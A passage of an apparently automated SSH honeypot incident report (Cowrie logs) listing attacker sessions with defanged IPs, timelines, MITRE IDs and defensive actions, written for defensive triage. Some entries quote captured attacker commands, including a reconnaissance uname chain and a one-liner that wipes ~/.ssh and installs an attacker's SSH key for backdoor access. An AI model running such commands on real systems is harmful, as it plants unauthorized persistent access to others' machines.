| `2026-07-26 16:00:19` | `cowrie.client.version` |
| `2026-07-26 16:00:19` | `cowrie.client.kex` |
| `2026-07-26 16:00:19` | `cowrie.login.success` |
| `2026-07-26 16:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2bcbcafce90

| Field | Detail |
|---|---|
| **Source IP** | `112.31.93[.]229` |
| **First Seen** | 2026-07-26 16:01 |
| **Last Seen** | 2026-07-26 16:01 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:01:05` | `cowrie.session.connect` |
| `2026-07-26 16:01:07` | `cowrie.client.version` |
| `2026-07-26 16:01:07` | `cowrie.client.kex` |
| `2026-07-26 16:01:11` | `cowrie.login.success` |
| `2026-07-26 16:01:15` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.93[.]229` to AbuseIPDB if not already reported
- [ ] Block `112.31.93[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b283ec422efd

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-07-26 16:01 |
| **Last Seen** | 2026-07-26 16:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:01:24` | `cowrie.session.connect` |
| `2026-07-26 16:01:25` | `cowrie.client.version` |
| `2026-07-26 16:01:25` | `cowrie.client.kex` |
| `2026-07-26 16:01:26` | `cowrie.login.success` |
| `2026-07-26 16:01:27` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03074021460

| Field | Detail |
|---|---|
| **Source IP** | `93.4.16[.]74` |
| **First Seen** | 2026-07-26 16:03 |
| **Last Seen** | 2026-07-26 16:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:03:37` | `cowrie.session.connect` |
| `2026-07-26 16:03:37` | `cowrie.client.version` |
| `2026-07-26 16:03:37` | `cowrie.client.kex` |
| `2026-07-26 16:03:38` | `cowrie.login.success` |
| `2026-07-26 16:03:38` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.4.16[.]74` to AbuseIPDB if not already reported
- [ ] Block `93.4.16[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09171166e5f7

| Field | Detail |
|---|---|
| **Source IP** | `106.245.246[.]26` |
| **First Seen** | 2026-07-26 16:03 |
| **Last Seen** | 2026-07-26 16:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:03:43` | `cowrie.session.connect` |
| `2026-07-26 16:03:44` | `cowrie.client.version` |
| `2026-07-26 16:03:44` | `cowrie.client.kex` |
| `2026-07-26 16:03:46` | `cowrie.login.success` |
| `2026-07-26 16:03:47` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.245.246[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.245.246[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0134e05f4586

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-26 16:03 |
| **Last Seen** | 2026-07-26 16:04 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:03:53` | `cowrie.session.connect` |
| `2026-07-26 16:03:54` | `cowrie.client.version` |
| `2026-07-26 16:03:54` | `cowrie.client.kex` |
| `2026-07-26 16:03:59` | `cowrie.login.success` |
| `2026-07-26 16:04:03` | `cowrie.session.params` |
| `2026-07-26 16:04:03` | `cowrie.command.input` |
| `2026-07-26 16:04:03` | `cowrie.command.input` |
| `2026-07-26 16:04:03` | `cowrie.command.input` |
| `2026-07-26 16:04:03` | `cowrie.command.input` |
| `2026-07-26 16:04:03` | `cowrie.command.input` |
| `2026-07-26 16:04:03` | `cowrie.command.success` |
| `2026-07-26 16:04:03` | `cowrie.command.input` |
| `2026-07-26 16:04:03` | `cowrie.command.input` |
| `2026-07-26 16:04:03` | `cowrie.command.input` |
| `2026-07-26 16:04:03` | `cowrie.command.input` |
| `2026-07-26 16:04:08` | `cowrie.log.closed` |
| `2026-07-26 16:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1a6a738bc4

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-07-26 16:06 |
| **Last Seen** | 2026-07-26 16:07 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:06:55` | `cowrie.session.connect` |
| `2026-07-26 16:06:57` | `cowrie.client.version` |
| `2026-07-26 16:06:57` | `cowrie.client.kex` |
| `2026-07-26 16:07:03` | `cowrie.login.success` |
| `2026-07-26 16:07:04` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-312b7467f00a

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-07-26 16:07 |
| **Last Seen** | 2026-07-26 16:07 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:07:15` | `cowrie.session.connect` |
| `2026-07-26 16:07:16` | `cowrie.client.version` |
| `2026-07-26 16:07:16` | `cowrie.client.kex` |
| `2026-07-26 16:07:22` | `cowrie.login.success` |
| `2026-07-26 16:07:24` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b676d331c74f

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-26 16:08 |
| **Last Seen** | 2026-07-26 16:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:08:29` | `cowrie.session.connect` |
| `2026-07-26 16:08:30` | `cowrie.client.version` |
| `2026-07-26 16:08:30` | `cowrie.client.kex` |
| `2026-07-26 16:08:31` | `cowrie.login.success` |
| `2026-07-26 16:08:32` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f884ab21a7

| Field | Detail |
|---|---|
| **Source IP** | `49.206.194[.]29` |
| **First Seen** | 2026-07-26 16:08 |
| **Last Seen** | 2026-07-26 16:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:08:37` | `cowrie.session.connect` |
| `2026-07-26 16:08:38` | `cowrie.client.version` |
| `2026-07-26 16:08:38` | `cowrie.client.kex` |
| `2026-07-26 16:08:40` | `cowrie.login.success` |
| `2026-07-26 16:08:41` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.194[.]29` to AbuseIPDB if not already reported
- [ ] Block `49.206.194[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-229a375009c0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-26 16:09 |
| **Last Seen** | 2026-07-26 16:09 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:09:42` | `cowrie.session.connect` |
| `2026-07-26 16:09:43` | `cowrie.client.version` |
| `2026-07-26 16:09:43` | `cowrie.client.kex` |
| `2026-07-26 16:09:50` | `cowrie.login.success` |
| `2026-07-26 16:09:55` | `cowrie.session.params` |
| `2026-07-26 16:09:55` | `cowrie.command.input` |
| `2026-07-26 16:09:55` | `cowrie.command.input` |
| `2026-07-26 16:09:55` | `cowrie.command.input` |
| `2026-07-26 16:09:55` | `cowrie.command.input` |
| `2026-07-26 16:09:55` | `cowrie.command.input` |
| `2026-07-26 16:09:55` | `cowrie.command.success` |
| `2026-07-26 16:09:55` | `cowrie.command.input` |
| `2026-07-26 16:09:55` | `cowrie.command.input` |
| `2026-07-26 16:09:55` | `cowrie.command.input` |
| `2026-07-26 16:09:55` | `cowrie.command.input` |
| `2026-07-26 16:09:56` | `cowrie.log.closed` |
| `2026-07-26 16:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffca2e3adfa2

| Field | Detail |
|---|---|
| **Source IP** | `65.20.187[.]47` |
| **First Seen** | 2026-07-26 16:12 |
| **Last Seen** | 2026-07-26 16:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:12:03` | `cowrie.session.connect` |
| `2026-07-26 16:12:03` | `cowrie.client.version` |
| `2026-07-26 16:12:03` | `cowrie.client.kex` |
| `2026-07-26 16:12:05` | `cowrie.login.success` |
| `2026-07-26 16:12:05` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.187[.]47` to AbuseIPDB if not already reported
- [ ] Block `65.20.187[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef6386b3bd06

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-26 16:21 |
| **Last Seen** | 2026-07-26 16:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:21:14` | `cowrie.session.connect` |
| `2026-07-26 16:21:15` | `cowrie.client.version` |
| `2026-07-26 16:21:15` | `cowrie.client.kex` |
| `2026-07-26 16:21:21` | `cowrie.login.success` |
| `2026-07-26 16:21:23` | `cowrie.session.params` |
| `2026-07-26 16:21:23` | `cowrie.command.input` |
| `2026-07-26 16:21:23` | `cowrie.command.input` |
| `2026-07-26 16:21:23` | `cowrie.command.input` |
| `2026-07-26 16:21:23` | `cowrie.command.input` |
| `2026-07-26 16:21:23` | `cowrie.command.input` |
| `2026-07-26 16:21:23` | `cowrie.command.success` |
| `2026-07-26 16:21:23` | `cowrie.command.input` |
| `2026-07-26 16:21:23` | `cowrie.command.input` |
| `2026-07-26 16:21:23` | `cowrie.command.input` |
| `2026-07-26 16:21:23` | `cowrie.command.input` |
| `2026-07-26 16:21:24` | `cowrie.log.closed` |
| `2026-07-26 16:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bbc6cf76305

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-07-26 16:31 |
| **Last Seen** | 2026-07-26 16:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:31:28` | `cowrie.session.connect` |
| `2026-07-26 16:31:29` | `cowrie.client.version` |
| `2026-07-26 16:31:29` | `cowrie.client.kex` |
| `2026-07-26 16:31:31` | `cowrie.login.success` |
| `2026-07-26 16:31:32` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72cb071ac48c

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-07-26 16:33 |
| **Last Seen** | 2026-07-26 16:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:33:11` | `cowrie.session.connect` |
| `2026-07-26 16:33:11` | `cowrie.client.version` |
| `2026-07-26 16:33:11` | `cowrie.client.kex` |
| `2026-07-26 16:33:12` | `cowrie.login.success` |
| `2026-07-26 16:33:12` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47dd574437fa

| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-07-26 16:33 |
| **Last Seen** | 2026-07-26 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:33:17` | `cowrie.session.connect` |
| `2026-07-26 16:33:18` | `cowrie.client.version` |
| `2026-07-26 16:33:18` | `cowrie.client.kex` |
| `2026-07-26 16:33:20` | `cowrie.login.success` |
| `2026-07-26 16:33:21` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9bb6f85997d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 16:42 |
| **Last Seen** | 2026-07-26 16:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:42:48` | `cowrie.session.connect` |
| `2026-07-26 16:42:48` | `cowrie.client.version` |
| `2026-07-26 16:42:48` | `cowrie.client.kex` |
| `2026-07-26 16:42:49` | `cowrie.login.success` |
| `2026-07-26 16:42:49` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:42:49` | `cowrie.direct-tcpip.data` |
| `2026-07-26 16:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b3b78d670e4

| Field | Detail |
|---|---|
| **Source IP** | `89.167.17[.]184` |
| **First Seen** | 2026-07-26 16:44 |
| **Last Seen** | 2026-07-26 16:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:44:34` | `cowrie.session.connect` |
| `2026-07-26 16:44:34` | `cowrie.client.version` |
| `2026-07-26 16:44:34` | `cowrie.client.kex` |
| `2026-07-26 16:44:35` | `cowrie.login.success` |
| `2026-07-26 16:44:36` | `cowrie.session.params` |
| `2026-07-26 16:44:36` | `cowrie.command.input` |
| `2026-07-26 16:44:36` | `cowrie.command.failed` |
| `2026-07-26 16:44:36` | `cowrie.log.closed` |
| `2026-07-26 16:44:37` | `cowrie.session.params` |
| `2026-07-26 16:44:37` | `cowrie.command.input` |
| `2026-07-26 16:44:37` | `cowrie.session.file_download` |
| `2026-07-26 16:44:37` | `cowrie.log.closed` |
| `2026-07-26 16:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.167.17[.]184` to AbuseIPDB if not already reported
- [ ] Block `89.167.17[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b50cdb36a3a

| Field | Detail |
|---|---|
| **Source IP** | `89.167.17[.]184` |
| **First Seen** | 2026-07-26 16:44 |
| **Last Seen** | 2026-07-26 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:44:37` | `cowrie.session.connect` |
| `2026-07-26 16:44:37` | `cowrie.client.version` |
| `2026-07-26 16:44:37` | `cowrie.client.kex` |
| `2026-07-26 16:44:38` | `cowrie.login.success` |
| `2026-07-26 16:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.167.17[.]184` to AbuseIPDB if not already reported
- [ ] Block `89.167.17[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d09d81410666

| Field | Detail |
|---|---|
| **Source IP** | `89.167.17[.]184` |
| **First Seen** | 2026-07-26 16:44 |
| **Last Seen** | 2026-07-26 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:44:38` | `cowrie.session.connect` |
| `2026-07-26 16:44:38` | `cowrie.client.version` |
| `2026-07-26 16:44:38` | `cowrie.client.kex` |
| `2026-07-26 16:44:39` | `cowrie.login.success` |
| `2026-07-26 16:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.167.17[.]184` to AbuseIPDB if not already reported
- [ ] Block `89.167.17[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2dc69d3f3b7

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-26 16:50 |
| **Last Seen** | 2026-07-26 16:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:50:09` | `cowrie.session.connect` |
| `2026-07-26 16:50:10` | `cowrie.client.version` |
| `2026-07-26 16:50:10` | `cowrie.client.kex` |
| `2026-07-26 16:50:11` | `cowrie.login.success` |
| `2026-07-26 16:50:11` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b5221be970

| Field | Detail |
|---|---|
| **Source IP** | `58.22.255[.]28` |
| **First Seen** | 2026-07-26 16:50 |
| **Last Seen** | 2026-07-26 16:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:50:16` | `cowrie.session.connect` |
| `2026-07-26 16:50:17` | `cowrie.client.version` |
| `2026-07-26 16:50:17` | `cowrie.client.kex` |
| `2026-07-26 16:50:20` | `cowrie.login.success` |
| `2026-07-26 16:50:20` | `cowrie.direct-tcpip.request` |
| `2026-07-26 16:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.22.255[.]28` to AbuseIPDB if not already reported
- [ ] Block `58.22.255[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

